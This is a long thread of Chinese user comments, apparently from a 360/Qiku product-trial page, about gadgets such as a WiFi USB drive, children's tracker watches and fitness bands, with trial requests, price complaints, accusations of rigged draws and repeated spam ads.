性价比超高。赞一个。。。。。
就需要这样一款产品来“拴住”身边的电子设备。
再写点吧，楼主
好期待能得到啊 第二次参加这类活动 好期待---
多少钱啊？
 期待！   我也想写写评测报告 
就是贵了点，一点不亲民，二三十还可以考虑。
已申请使用，之前由于出差未抢到，十分遗憾。现已有很多同事在用360wifi，用他们的网络感觉时体验效果十分完美，但U盘版更适合我，希望幸运女神降临，可以获得体验资格。PS：360智键使用体验非常完美，赞一下！
什么时间可以买啊，快点啊
你用过？在哪买的？多少钱？
没中，真惨。
一点也没用。
太贵了，买不起。
续航时间太短了点吧？
谁会一边切菜一边按ipad啊。这东西除了要防水防尘还要防砍，在称重和防砍功能上不会觉得有技术冲突吗？
东西不错，我看行
期待！ 有了一个360wifi  但是优盘版的   对于我更好，每天都打印文件  优盘来优盘去  呵呵   我也想写写评测报告  
如果能把这个U盘做成可以启动的装入PE进去，这样维护电脑比较文件，装完系统……没有网卡驱动就死定了，这个自驱的话一可以下驱动，二可做维护用就方便多了。
支持WP（简称windows phone）么？Lumia
这样的话，应该至少是上一万了吧。
有型，我喜欢
科技感很强， 
现在u盘都降价了，39.9这个价格和买一个U盘再买一个随身wifi差不多
感觉还是不错的，希望能够得到，谢谢！ 
很酷 符合我的审美观，功能还多真不错 就是太贵
不给价钱怎么约 到时不付钱吗
很帅，很有质感的体重秤啊。很想买一个。
不错，希望发货快一.
抓紧出啊！要了命了！
快快发出来吧,感觉不错的东东
人品啊...
看着很帅 比latin那个要精致许多..
这位运气要爆天了。居然一代二代都能有试用。直观评价，报告很详实
东西设计的真的很漂亮，比只有U盘功能的产品都好。
到底是卖还是不卖啊？第一代还没发售就更新到第二代了！你只顾着更新不发售有个毛用？？？是不是我们眼睁睁看着你更新而用不上？是不是儿童卫士3又快出来了？你逗我们玩呢？我就想问一句话，360儿童卫士8代之前我们能用上不？给个回答！谢谢
创意中你妹个创意中！再创意我孩子都长大了，要你有吊用？是不是我儿子都参加高考了你还创意中呢？真TM气人！科技领先的同时能不能有点速度？？？
麻痹再不发售以后电脑卸载360，手机卸载360！从此不再关注360！真他妈垃圾
儿童卫士8之前还能不能发售了？你逗我们玩呢？再不发售孩子都长大了，要你有吊用？试用的全是你们内部员工吧？
举个例子，云盘10T是专署的，如果U盘WiFi坏了，那么云盘何以保障？
外观非常漂亮。
第一次申请，没中，继续努力，重在参活
云U盘很给力，有了它，你所有的360网盘都能变成10T，可以随时解绑，随时换360账号
充电口坏掉了（：便宜的话来一套。正在使用杂牌无线充电套装中。。。。
目前，三星Galaxy S3/S4，Note 2以及Note 3均能够与Luxa2相匹配。用户只需要将Luxa2贴片附着在手机电池上，即可实现手机的无线充电功能。 文章所列手机自带无线接口触点所以说三星。其实现在有不少其他牌新机都有这功能了。
支持360
孩子又长大了一岁.希望360儿童卫士能打造声势.最好能强调已经在每个孩子出生的时候就植入了每个人的体内.这样就直接给人贩子压力了.避免了一些孩子的被拐骗.至于一些自己都丢的孩子只能说(省略号)了.也许在能买到这360儿童卫士的时候,我的孩子和我说(我需要自己的空间).完蛋还是自己带着吧.毕竟这些功能也适合自己.建议,强力建议360儿童卫士把名称中的儿童去掉...也许买到的时候自己用孩子也安心...
不说东西怎样，创意不错
智能家居产品硬件、软件技术交流群、智能家居爱好者群：31830793 ，暗号：钢铁侠
智能家居产品硬件、软件技术交流群、智能家居爱好者群：31830793 ，暗号：钢铁侠
智能家居产品硬件、软件技术交流群、智能家居爱好者群：31830793 ，暗号：钢铁侠
智能家居产品硬件、软件技术交流群、智能家居爱好者群：31830793 ，暗号：钢铁侠
智能家居产品硬件、软件技术交流群、智能家居爱好者群：31830793 ，暗号：钢铁侠
淘宝有的买。。但是要月底有货。。而且。。你也可以百度。。
上次问一个做人体称的工厂老板说，这是骗人的，体脂肪是电子计算出来的
需要解决电源的问题，否则会很麻烦；如何与现在的防盗门匹配，如果很容易弄下来，很容易丢的；价格需要低廉，否则推广比较难；有没有自动控制报警功能，或者自动开门功能。
有点贵，16美元各种颜色一套，那还差不多
感觉很牛逼的样子
运气真是好，我是不指望试用上了，就等着看他什么时候上市卖啊！
价格太高，除了富二代和官二代能买似乎再也不好找了
这么好的东西 好期待
喜欢可以去点名时间网 支持一下~谢谢~
购买网页呢？？？
真神了，人类将来除了头部其他就退化了
这个还可以 比较实用一些
感觉很牛逼的样子 
还用动物皮，只想说没有买卖，就没有杀害。。。
智键相机，闪拍，手机加速，手电筒，录音，Home键
太大~~~~~~~~~还没挂绳
真的抢不到，希望早点发售！
怎么没有购买网页？？
怎么购买，多少钱？/
好贵。。。。。。。。。。。。。。。。。
我们点名时间众筹仍在继续，有兴趣可前去了解一下我们的产品http://www.demohour.com/projects/344944
一见倾心，求通过
快点吧！等不及了奇酷     希望奇酷产品永远奇特  COOL
360官网标价99，京东价199，尼玛，京东才是最大的黄牛。
正解！！但你没想到！！！
你这是打酱油把 太少了  不用心
这个厉害，高科技！
运气真好，都两个啦。
这个真好，不用冲电不说，还可以防止宠物丢失，我家的猫这回丢不了了，是不是可以放在孩子身上？我看比儿童卫士强多了，不需要对话录音，只需要定位寻找。
什么时候出已经很长时间了？
京东已经有售啦！京东搜索LifeSmart
推荐一个替代360手环的产品吧。http://detail.tmall.com/item.htm?spm=a230r.1.14.1.g7YryE&amp;id=39025584788&amp;ad_id=&amp;am_id=&amp;cm_id=140105335569ed55e27b&amp;pm_id=
求通过，wifi加U盘，很期待啊。。。
我是路过……
忒简单了 还不如给我用
官方价格2200元，京东618促销是1890元 淘宝价格2020元
天猫现卖的是一样的吗，评价发热很严重啊
很看好这款产品。。
你是360内部人员么？注意回避一下啊。怎么几次都有你？
提个建议：能不能把外壳做成天线，（塑料里面夹线圈，再露出几个金属点，有利于信号发射，）散热能力不知怎么样？
这多少钱啊。估计会很贵。
根么就抢不到，速度也太快了吧！！！
我去，1秒钟就没了
我是做电脑维修的，我很需要一款这样的产品
有酷币有什么用啊，抢不到啊 
总共就三天，就算我能穿越也抢不到
希望是我！！！！！！！！！！！
Bringrr 防丢追踪器和iFind 蓝牙防丢器，有什么区别？
没中呀，希望下一期可以中呀
您好，体脂率等各项数据都是通过各种标准计算出来，可能是亚标或者欧标，也可能是其它算法，都有精确的数据和权威的标准去计算，所以说算出来的是没错，但是绝不是骗人的。在不是非常清楚算法和构造的原理基础上，有些工厂老板也可能在沟通上过于简单，用通俗的概念向客户阐述了这样的一个情况，所以大家可能会有一些误解。
我是职业网络工程师，我现在很需要类似这款的工具！！！
挺喜欢，但我不吃鱼！
要能好好的玩游戏就好了！
那个盖子和wifi 封开设计是软肋，很多人都把盖子忘记了，丢在哪里都不知道 
创意无限，构思精巧，好东西！
儿子一天天长大，越来越淘气，真有点担心这么可爱的儿子丢了！360加油！顶起来
ipad也能变成笔记本电脑了！
我和网络黄牛买了一个花了 230RMB无线性能没有传说的那样好
世博会看过这样的产品的。
事业单位工作，需要该产品，你懂得
不错，向你学习
希望能通用，有绿色的更好！
造型最好再经典些！
***日货！！
山寨奇虎360的商标！
不求被馅饼砸到，但求能买到馅饼。馅饼什么时候发售呀？？
一直是360粉，真的很想试验一下。
tianjia天价
一点进去就没，真的假的啊？
买了七八个360随身WiFi 都是一如既往的好，但是真的想要个带U盘的，求成全
申请一个!
传说中好用、实用的神器，期待试用。
yes...........
智键相机，闪拍，手机加速，手电筒，录音，Home键 
那也买不起,10万5千5哪
我想要。。。。。。
什么是好可以买？？ 都等的不耐烦了
到底有什么用？
太假了，可以中两次！！
还不卖，孩子都快用不上了。
太简单了，估计很多试用都是敷衍
你想多了 好一点的山地车都一两千块
额，就10万而已。
穿墙性能能更好一点吗？？？？？？
希望U盘上面加上钥匙功能和读卡器功能，功能多点能当钥匙开门，随身携带便利美观漂亮
内存有点小需要升级改进，
科技有利有弊，能让人类的生活更美好，也可能会使人类的一些功能退化
太NB的炫酷手环了。
啧啧 这价格...1070美元（6600元人民币）
必须申请啊
我去 看上去好酷！！
看着真不错啊
儿童卫士没有，就这个了！！
U盘上面加随身携带便利美观漂亮 
前排支持啊
这货能为想减肥的人带来动力吗？
看介绍好棒的感觉啊
支持加上读卡器功能
全方位防水设计，沐浴，游泳均可贴身相伴，续航长达30天。我喜欢 
我也希望能能加上读卡器功能
没中，有点闷，不过还是感谢360和奇酷网，打造这平台。
小巧些，能外接U口，这样就不占用电脑U口了。
看着功能挺强大呀。能更系统了解自身的习惯。
手表好久卖呀？
购买网页打不开啊
这个很期待啊。
商品怎么下架了？
最好是USB 3.0的接口
最好可以反复充电，这样就更方便了
看介绍是不错的，材质环保，智能健康，只要是能为健康保持平衡。我喜欢！！
100%的期待 给你点32个赞呦   赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞赞
嗯嗯嗯嗯嗯
必须要申请啊，多棒的功能
智能健康，设计简约，功能强大，全方位防水如此好的一定要申请！争取拿到试用！
好像试用一下，体验一下到底是什么样的
120美元太贵了点吧？
很不错的东西！功能很不错喜欢 希望使用通过
没有墨水了怎么办啊 
可是也太贵了吧 400多接近500了
才120美元，能不能再高点。这么点定价称不上高端大气上档次！
这360只知道要别人出东西，自己出过啥出一般都在上面刻个360，再说充电汽车自己家要多少电来充啊？坑人！
内存有点小需要升级改进， 
全力支持活动。                           
智能设备技术、硬件、使用交流群：31830793  暗号：世界杯
智能设备技术、硬件、使用交流群：31830793  暗号：世界杯
智能设备技术、硬件、使用交流群：31830793  暗号：世界杯
智能设备技术、硬件、使用交流群：31830793  暗号：世界杯
怎么我就抢不到呢，真的很想很想拥有
今天才发现的问题  我装上360智健 电话打不了了  对方听不见我的声音 说有杂音  我的是M3求解决
哎呀，这真帅，要是再美观点多好
看介绍很不错，不知道怎么样实现运动状态的识别，期待试用。
这个创意不太好，跟着追踪没什么两样。有个建议：当一方抚摸手环时，可以给另一方传递温暖抚摸的感觉，这样效果会更好。
一直很期待有一款国产品牌的运动手环，终于等到了！一定要试用！！！
造型好漂亮
淘宝上有这种东西了，不过外形不好看
支持活动！！
这是逆天的产品。。我要逆天。。哇哈哈哈哈哈。。好吧。。原谅我这么脑残的激动。。
感觉不错，希望能试用下。
功能很强大，这个可以有，期待。
500多，呵呵，你想多了
加油，可以改善我的睡眠质量
非常希望能有这样一款智能运动手环。真正的和我的运动结合起来。感觉太棒了！！
必须支持咱奇酷的活动！！
天天用咕咚跑步，经常研究相关软件及智能手环，特别想买一个，但是太贵了，不让买，非常期待这一款智能手环，支持国产！值得拥有！
郁闷，到底申请剩余时间是多少啊。一直变来变去，我智商这么低？这个都不知道？我都怀疑自己的眼睛了。
厉害。。。。
好东东  期待中
一直宅在家，身体得不到锻炼，希望可以得到这个手环，帮助分析我的身体状况，制定合理的饮食作息运动指导~
给力，心动，心动
交个朋友，行不行
不知这个手环能否充电
跟大陆无关。
既然防水，不知能不能防电，防潮，防高温
还有11分钟，紧张时候即将到来
操蛋360，麻痹的，到底申请时间是多少，没中就没中，变来变去的，王八蛋。本来是想用这个产品的，不中可以去买，现在你们去死吧。
嘘，偷拍功能我喜欢！
是不是放错地方了，怎么放到可购买里了？还在创意中吧？
希望能够选中我从来都没有中奖啊
功能好不好啊
中了么/？
能申请到的几率好渺茫，但是这2也不知道什么时候能发售啊
没中！！！！！
为什么就没有设计师想到在车上加个快拆的宝宝座椅啊，载重100KG呢，完全可以一个大人带一个小朋友使用啊，动物园什么的，大的吓死人，跑断腿有没有！市面上所有的平衡车都没有想到这个功能呢，赶紧加上去，销路肯定好。
又一款历史新作，给力的功能，一直在支持！
希望可以得到
很期待!!!
顶一下，希望发我一只，谢谢
可以给我试用一下吗？谢谢
好想用一下，看看能不能抵御病毒
很好，总比抢不到、买不到的强！360加速吧，期待越高、失望越大，别让我们再等了
申请了很多次一次也没成功，希望这次能成功！！！！
期待啊期待！！！！！！！！！！
楼下请安静，我已经连续申请第11期了。。。
祈祷能成功。。。
别逗 排队，------------------------------------
来吧，来吧，让我提交一份评测吧！
come on！！！ 
啥时候试用可以落在我的头上呢？
可以让我中一次吗？多次淘宝试用报告经验！
让我中一次吧，多次某宝试用报告经验
很多次了，就是不让我交1份评测吗？
全方位防水设计,个性！时尚！优雅！超级省电！“睡眠助手”、“运动数据”、宝贝做工非常棒!感觉有档次!赶紧大批量上市，方便大家一起使用.
高端产品啊，不错的好产品！
我不要评测，我要直接购买！赶紧上市吧。
智能手环特别实用，能很好地检测我们的运动状态、睡眠状态，超喜欢
我认真看完这篇报告了 
这个厚度   能不能薄一些
那个   眼镜的话怎么办
你确定是正品吗？
看样子挺时尚
建议你买这款儿童定位手环，功能比较多，实用 http://item.taobao.com/item.htm?spm=a1z10.1.w7729142-7042955007.2.bp0LwH&amp;id=39397594111这款已经有货。
建议你买这款儿童定位手环，功能比较多，实用 http://item.taobao.com/item.htm?spm=a1z10.1.w7729142-7042955007.2.bp0LwH&amp;id=39397594111这款已经有货。
想尽快使用
等天落@~
卖个肾能买得起吧  
只见过有好多块拼装电池的
让我们祈祷吧，中签！
我在等待希望。我已经买4个产品
期待提交报告……
送690个的时候错过了 希望这次幸运女神关照一下
希望第一次提意见能得这个小东西的试用
你这更直接
不知道它的材料是什么，佩戴时会不会夏天出现皮肤不适。
让我试用一下呗！
小伙伴们 快去免费申请哈~~
中了，希望尽快收到宝贝，试用后给大家介绍优缺点吧
早就有智能穿戴，只是没买过今天看这个可以体验一下就挺好，样子比较简洁时尚工作时不会难看。
这个产品才是智能硬件的核心控制器啊。
超级智能家居。
不错 支持
很期待啊！！！！！
支持一下！
希望让我试用一下哈
我正在申请这个手环，希望能成功
一直想要个智能手环，希望这次申请能通过。
败家国度，壕国度
参加奇酷网的#奇酷试用#活动，领先时科技前线。
有助运动数据统计的神器，期待来一个。
很期待，希望能中
我看了，很中肯！
我中了，感谢，只是还没收到！
看样子不错，能和手机交换数据吗？
是不是不能通过啊
115的酷币 你们知道我有多努力
你当是iPhone那种廉价产品呢……Vertu可不是一个肾就打发了的……
重量是个问题 带的时间 还要运动  脖子负担很大吧
希望可以体验使用》》》》》》》》
有道理。。。。
鬼才看完。。说了那么多。。除了开头。。后面的直接鼠标中键下滚了。 。而且。。很多应该是网上找来的。。看完的都是在厕所上网的时候突然断网了。。
有点太贵了~
希望可以体验使用，好好测评
试用报告写的很详尽~
要出邮费吗？
很期待这款产品，希望不要让我们失望，价钱不要太贵了
这个小K早就出成品了，淘宝上有很多店有销售
希望有一个 运动表 来给自己 计划 运动量
太假了，都两个了，不是亲戚朋友就是内部员工，我申请几次都没有成功？？？？？？
这个产品看起来不错
什么时候开始卖啊？如果50-100元，我肯定买一个。
两点：1 价格，低于300可以接受，每年90也没有问题；2 能否增加脱落难度，比如只有父母可以摘下该手表。
等啊......等啊......继续等！
 正能量来袭  会抽到我吗
好高端啊啊啊啊啊啊啊
更新之后，终于有了截屏功能了，太棒啦！
啊，我该胖胖了，每天睡眠质量好差。
睡眠，工作，运动，都能做好的记录，生活慢慢也可精细化管理啦……
中中!!!
努力努力再努力，争取抽到我！
努力努力再努力，争取抽到我！
期待期待再期待，我好想要！
期待期待再期待，我好想要！
期待期待再期待，我好想要！ 
什么时候可以上市发售呀!期待中~ ！~
我很少运动，有了它希望我能对运动热爱起来。现在工作也不怎么轻松，运动量也挺大，怎就胖了呢？
已经用上了，很不错
这 连排版都不弄吗 也太..........
WP简称Windows phone。真是简
感觉不错，就是不知道他的预售价格是多少？
参加奇酷网的#奇酷试用#活动，领先时科技前线。 
怎么申请我想要
期待期待再期待，我好想要！  
我是骑行爱好者，想测试与骑行运动相关的内容，如：心率、卡路里等等
本人睡眠不太好，想改善。好想要哦！
不知道支不支持OTG协议。
目前市面上的智能手环比较多，但实际功能如何，还真没体验过，最主要是价格方面以及它的实用型方面考虑！！
买了两个，体验不支持，最主要是wifi方面体验太差，而且有时配对不上。
不知道拍出来的视频是什么格式的？
要是锁屏时能用就好了。
说的好！~不过3D打印技术应该不只如此吧，希望能有更多新产品！
试用多少天一期？竟然漏过去了，新手啊。。
有点意思！看看
好神奇，可不可以当优盘用。
可不可以播放音乐？
可以连接手机吗？
我本人不爱运动，爱贪睡。有了智能环，我想可能好一点
运动手环与智能手表的完美结合。
中考压力大，黑眼圈自动出来了，希望这个在暑假能帮助我改变睡眠质量。
我好喜欢嘛   
非常牛了呀
我也要一个呀 
中考复习到很晚，明天都睡不好。希望能够在暑假放松的运动一下，非常希望得到它！
真的没想到会中啊，真的是意外惊喜，希望赶快收到，做个详细的试用报告，好期待啊！！非常感谢
好想来一个
你都用上了？方便吗？
690。。。。。买不起啊！
唉呀妈呀，这不是红果果的诱惑我吗？不行了，不看了，因为木有钱啊！ 
真的没想到会竟然中，意外啊，，意外惊喜，希望赶快收到，保证会做个详细的试用报告，表示超级好期待啊！！非常感谢奇酷。。谢谢
太贵了，属于奢侈品
如果在1-49元，你就不买了吗
看到还多小巧的，不错。100元以内可接受
小伙伴们 快去免费申请哈~~ 
很实用，很便携的一款随身wifi，360wifi，免费好用没道理
明天就要中考了，赶快申请一个暑假去锻炼！
这个好，集系统盘、随身WIFI于一身，值得拥有！
看中睡眠监测和30天待机，让我换电池也愿意啊，每天充电多麻烦啊。还能督促我多运动，我想也没有比这个活跃点更能督促我的了
不错，力挺，期待中。。。。。。。
我一直很喜欢360，加油，相信我你做的更好，走的更远，我们一路跟随。
是你，更好
想要高质量的睡眠，对功能很满意、
.. ...............
申请在哪~~~~~
我给这个产品提供配件，是我客户的，如果需要订购，我可以帮到大家。ijamesxiao@gmail.com
真霸气！这个可以努力一下
关注中~~~~看看什么价格
真TM恶心  每次来看都是预约结束  最讨厌饥饿营销了   小米别的优点你没怎么学  饥饿营销你学的那么快
真的是很漂亮，功能强大，也很好玩，很酷，可惜我的手机是三星S3的，不支持，的给我换了新手机再考虑吧
很实用，很厉害！
怎么才能得到？
bong是全世界第一款能够自动识别你的活动状态的健康手环，时尚，超薄，仅需佩戴，别无其他。bong可以精确记录你的热量消耗和睡眠周期，并且智能地在你快苏醒时才通过震动把你无痛唤醒，同时让枕边人继续安睡。
它的规格究竟是多少？
为什么这儿3.6元，到了天猫就变成了9.9了
如果手机不用开蓝牙就可使用就更好了。
每项功能都很实用，运动达人的神奇啊 
50元以下就买一个
好像柯南的滑板 
买了rm2 rm1 各一台 实用
如果可以，可以做这个生意加盟，货投资
高档大气，上档次
期待中。。。。。。
跟进，期待你的发售
好东西呀！！！赶快申请一个来用
这个产品对于丢三落四的伙伴儿们绝对有用（包括我在内）
什么时间公开销售？期待中……
很好不错望成为试用官
唉！知道我是无缘申请到了，但还是相信360会做的更好，走的更远、、
好产品，够酷！
真是好产品！我支持奇酷！
智能家居产品硬件、软件技术交流群、智能家居爱好者群：31830793 ，暗号：钢铁侠 
智能家居产品硬件、软件技术交流群、智能家居爱好者群：31830793 ，暗号：钢铁侠 
智能家居产品硬件、软件技术交流群、智能家居爱好者群：31830793 ，暗号：钢铁侠 
智能家居产品硬件、软件技术交流群、智能家居爱好者群：31830793 ，暗号：钢铁侠 
老大，我叫你老大了，让我申请到把，我给你写详细测评
我支持奇酷！
每次都不中，期待能中一次
智能家居产品硬件、软件技术交流群、智能家居爱好者群：31830793 ，暗号：钢铁侠 
智能家居产品硬件、软件技术交流群、智能家居爱好者群：31830793 ，暗号：钢铁侠 
我要3个，QQ1647194728
我要，行吗
我会在不同的网络进行测试     
铁通   联通    电信    教育网    
碉堡了，比移动电源省心多了
该产品,太好了！！
很好的手环，期待拥有
假的很，竟然有1代和2代，说明奇酷试用是假的，都是内部人搞的，切
不是一般人的菜
希望有一个
希望有我啊
每日一看，静候佳音...
很好就是价格有点贵
很不错手环,续航防水都很棒.应该是比较前端的产品
试用不易，且筛选且珍惜。
bong智能手环！为你的健康带来很多的帮助。让我们看到了穿戴智能设备美好的未来。
就是这么好的产品怎么下架了？
这玩意儿，还是有哪么一点点儿用。
这东西根本就是鸡肋。
周末上班，是大自然的馈赠，也是人类智慧的结晶，勤劳的人类总是把工作当做美味，把加班当做文化的象征，--加班的周末
更多注重健康的产品，很符合现代人的健康观念，尤其符合办公室阶层！
这么好运，两个都有！
很赞！360真棒！
原理和扭扭车一样的，呵呵，不用电.........
呵呵。非常幸运能够被选中，期待产品的到来。。。 幸运与否，首先取决于你是否行动并用心了。
赞！！！！！！！！！！！！！！！！！！！！！！！！！！！
360就是牛
我运动，我健康。
不是特别喜欢扣带的材质啊，更喜欢更皮质一些，或者更有金属质感一些.
不错，期待拥有 
好嘛，别人一代二代都成功了，我代都不代！你说不代也行。。。你好歹开卖了吧。。。等得花儿都谢了。。。。前段时间又听说我们这里有小孩子被拐了。。。我那个心情哦~
尺寸的单位错了！是CM
我本人体弱多病生病有时还看不出来  非常喜欢
抓到一个大大！
大骗子一个试用这个手表可能是他们的亲戚朋友的也可能是那里的员工一个大骗子！！！！！！！！！！！！！！！！！！！！！！！！！
快点开始预约吧
不错不错 外观挺好看
等待中。。。。
第一次申请试用。不知道能不能通过。真的很想很想要！学生党伤不起。。 
感觉很帅气的样子 
坑人的产品，有市无货
这样是不是对减肥的更有帮助啊
更多注重健康的产品，很符合现代人的健康观念，尤其符合办公室阶层！ 
我最喜欢这个薄荷青的颜色了
名单是内定的吧？！怎么可能有些人1代和2代都抽到么？很怀疑中奖流程的透明度~
希望可以选上啊，宿舍台式机正需要、、、
我爸用了说不好，除了贵点，没啥特别的，我们好几个同学都有
好便宜，买一个去
不知道GLAXYMEGA6.3能不能用 
真便宜，买个去
总感觉扣子那个地方是个薄弱环节，带的久了会不会松动脱落啊。想试用一下！
买一个玩玩，只不过我全是三星，不喜欢苹果
帅我要买一个
我喜欢，买一个
买的起，但又不喜欢苹果
期待中。。。。
期待中。。。。 
哈哈哈哈哈
等待中。。。。
这个感觉非常时尚的样子。对身体健康又提醒和督促作用。顶顶顶！！！！！！！！！！！
好希望拥有一个
真TM恶心 每次来看都是预约结束 最讨厌饥饿营销了 小米别的优点你没怎么学 饥饿营销你学的那么快 恶心 !!!!!!!
就是一个可以运动的搓衣板嘛
我也想要!! 用过其他很多产品想试用360随身WIFI
什么情况?现在已经不能申请了么?
前面的金属质感和后面的木质感真是极大的反差，视觉效果太好了
如果我中，可以送给我的女朋友
我就是睡眠不好，我老婆也是，我想要一个，如果可以，再买一个
建议360生产线快速一些，即使不试用，让我们能买到也行啊，因为360WIFI生产速度缓慢，现在网上出现很多黄牛，以及山寨货，同类型的产品有很多，我相信大多数人跟我一样是信任360才等的，可这却损害了信任你们的人的利益，我同事第一次在淘宝买了一个是正品，第二次一起买了10个确实真假搀半，后来买了百度版的，也很好用，相信也有很多人像我们这种情况，这对你们公司本身就是一种变相亏损，销售策略很有问题
无限期待中
好想要，欧巴，给我一个呗？
设计不错 可惜没走平民路线
相当不错嘛
好像有一个，简直不敢相信他的功能
真TM恶心 每次来看都是预约结束 最讨厌饥饿营销了 小米别的优点你没怎么学 饥饿营销你学的那么快 恶心 !!
好像要啊 闹钟总是在睡得很熟的时候叫醒，都快神经衰弱了~~
第一次申请试用。不知道能不能通过。真的很想很想要！   
不错，期待拥有 
我就是睡眠不好，我老婆也是，我想要一个，如果可以，再买一个
这个感觉非常时尚的样子。对身体健康又提醒和督促作用。顶顶顶！！！！！！！！！！！
感觉很帅气的样子
真的是惊喜啊！第一次居然中了，期待她的到来。。。感谢！
怎么一直在筛选啊
不知道睡眠 监测效果好不好?
怎么申请？
你头像这么漂亮竟然想要？？？你真的真的很想要啊？
小编。。。还是我，拜托让我成功一次好不好。。。
图片斜了.......
东西是好，但是4G普及还要一段时间  
期待能被选中，360的产品越做越好
真的很想很想要！ 
白送给我就要，并且包邮。
功能挺好的 外观也很时尚轻便 坐等它的发展
希望能被选中，对睡眠有帮助，690元对于我来说有点贵，我是不会去买的，因为经济的问题。因为工作的问题，我长期睡眠不足
让我成功行不行
这东西 你值得拥有  
市场已经有售产品了，还在创意中？？？？
真的很想很想要！  
现在的人，很多都是亚健康，精神压力大，睡眠不足，对于青壮年的生活会很有帮助。如果能检测身体突发状况，并通过手机上指定的联系人通知到亲属。那就又是老年人的一个生命的保护盾了！价格上来说对于，年轻人690确实有点贵。毕竟不是智能手机，这就是现在中国人的普遍观念。而且也和收入有直接关系。
这个东西太好了
上次的使用产品都没中标，感觉很遗憾。希望这次能取得使用产品成功。希望电子产品不断创造出新产品我也真的很希望，好运降临
不错啊，我早买的都淘汰了。顶起
顶起，上次申请都没能得到 
 期待中。。。。。。  
这款产品挺好.实用.如果要是能打电话就更好了
很帅的样子
超级实用的的好东东   期待拥有一个  
这产品不错啊
图片正过来了，还加入了白天没写的功能，连写带改差不多半天......
创意很多的，想要马儿跑就要给马儿吃草，这次先提交一个，后续的共同勉励吧！
我真的很想要一个，，希望360能给我一个名额
非常好的，可以改变我的生活，想拥有一个。
我是第一次试用，希望名单里有我
支持奇酷  支持360  永远支持
希望能申请采购，值得拥有
希望能申请成功，值得拥有 
好吧，不知能不能中......
申请提交，希望幸运女神可以奖励我。
正在筛选，希望被幸运女神恩泽。
如果够幸运就可以向室友显摆显摆了。
怎么才能申请呢? 
不会把一代二代都能得到试用,是内部人员把.360是在耍我们,看他的报告就能看出.
求中求中求中
求中啊。。。。。。。。。。。
好用吗？一直想买个电子体温计给孩子量
实用，哈哈
感觉高度大气上档次啊
我爸买了哦
希望能中。
期待期待。。。。
快点发布啊.我急需要一个.
这么长时间了也不能预约 更不能直接购买 这是什么意思 价格随你定 买不买是消费者自愿的 只要产品好还怕没有销路吗  用不着这样  挺讨厌的
我就得这个这个手环可以有跑步的米数 可以计算消耗的脂肪的多少 应该有备用录 可以记录一些简单的事情 希望可以得到
我是第一次试用，希望名单里有我 ，正在筛选，希望被幸运女神恩泽。 如果够幸运就可以向室友显摆显摆了。 
太贵..........
期待新产品使用 ····
产品数量 : 100个 申请人数:31276人 试用结果公布时间：2014.06.20   希望女神降临我身上
这个是出自什么目的？？真心有用？？？？我只关心功能与价钱。
要是我中了那肯定是太阳西边出来了
你这个骗子 
精致厨房必备哦！赞一下！
希望我可以赢，恳求上天，让我得到吧！求求您了！
希望我可以赢，恳求上天，让我得到吧！求求您了！ 
希望我可以赢，恳求上天，让我得到吧！求求您了！ 
我的天，神器啊，给老婆用我就可以定位她在哪了，哈哈哈哈！
如果在不发布，可能大部360粉要转向其他家智能产品了，讨论饥饿营销
还不错。挺喜欢　的。
求中啊.......
喜欢................
怎么不和京东合作了，链接到海尔商城了，还下架了
我喜欢适合我
很好的  东东  
希望能抽中，参加过好多期了，但一次都没中过，这一次真的是很中意它的。
这女的好丑。。。。
你是大土豪
这么久了，一点消息也没了，什么意思
希望能过..
我也要！！给我留一块啊！
没体验到，但是上市一定会买。
我好想要啊
给我吧      好么？ 
这个东西不错，把优盘和wifi完美的结合在一起！帅呆了，要是可以把优盘加上密码我想会更好吧
好想要哦，会给我吗？
土豪啊.兄弟
这个价位         穷啊
一个手机算得上是智能硬件吗？
我也很中意啊，就是好远一像都离我很远，不怎么包希望了 哎！但是我还是会申请滴
现在不可以申请了吗
希望能过。
一直信赖360
你后面两张图借我一用，我的试用报告想插几张这样的图，可是，手机我不知道怎么截图到电脑，所以，，借用一下，我会在我的图片上写你的版权的。。谢谢了。。
我买的拿到了，还没用， 外观包装很不错，，可是手环我觉得还是偏厚了，而且主体部分太硬，贴着皮肤的这一面还是要处理的更舒服才行，现在带手上不舒服！！！觉得亏了。。。
如果还能显示时间带蓝牙耳机功能就更棒了
看样子不错小伙伴们 快去免费申请吧
想要想要啊
很想试用一下这个新产品
我热爱运动，骑行第一，跑步第二，我喜欢尝鲜新奇的产品，外表炫酷，功能强大。我喜欢我选择BONG我要试用，谢谢
我一个都没有,真希望中!!!!
我还没用过呢，这次一定要让我实现 
想要..坐等销售……
希望能有机会试用此产品，体验新事物。 
希望中，一定要中！！
真的是惊奇啊！第N次居然又不中了，期待的到来。。。
价格稍贵了 
也帮我留一块
求看我的试用报告，求给赞，求评论，求......等我想到了再求吧。。
我的评论怎么不见了。
希望能进，360万岁！
怎么还能开关电视？
太好了，就是可能会侵犯人家隐私
买了个360U盘，插进电脑不久就发烫，一定上70°
真是辛苦了，能设计出这么好的东西
太酷了...
什么时候出来，想入手
不是吧 怎么回事..
最后一段超赞，嗯，就是大家一起加油，才会进步
地图有必要挡住嘛。。。。⊙﹏⊙怪难看的。。。不过还是辛苦啦！
哈哈，楼主暴露你的wifi密码了
这样的长篇大伦竟然没有人来吐槽。算了，我自己先吐个槽。免得自己的论文都没有人看。好吧，这不是论文......
哈哈，无所谓啦，不过好眼力，赞一个
嗯嗯，一起加油
用了每个人都是都教授啊，超能力！开开关关随心所欲，正！
顶顶更健康！
试试吧，申请这么多，还没中过...
最中意的儿童卫士没中到，真的很遗憾
好不容易等到一个适合自己的果断申请了，希望能成功啊
你们的回复效率真高
价格是个大问题
6月20日公布...正好是我生日诶，希望多一份生日礼物吖~~
一天生产那么多垃圾，可我没那么多花草可养啊
功能看起来真的好好啊，特别是伪闹钟功能
说实话既然是智能耳机APP的应用很关键 然后产品的做工用料必须严控 品控做好了才能谈优化 后续的调音 细节等方面可以慢慢改进
有人看滴~~写得好丰富呀
写得不错哈，后面奇酷会越来越给力！！
写得好详细啊，，赞一个
希望这次能申请成功 
这个功能真的很厉害啊，我觉得检测睡眠这项听起来太牛了！
这个蓝牙貌似必须一直开启。。。不费电么？
不错，期待试用效果。
一边写可预约，一边写预约结束，自相矛盾？
真不错，不知道出来后，我是否能买台
闹钟功能绝对实用！颜色可以多样化~方便搭配衣服
xiaoniu
我等好久了啊特期待
我建议除了定位功能跟时间保留，其余的功能都去除，减少耗电量，并且加大电池容量，最起码能维持一周！要不然的话，真丢失了孩子还没找到呢电没了！
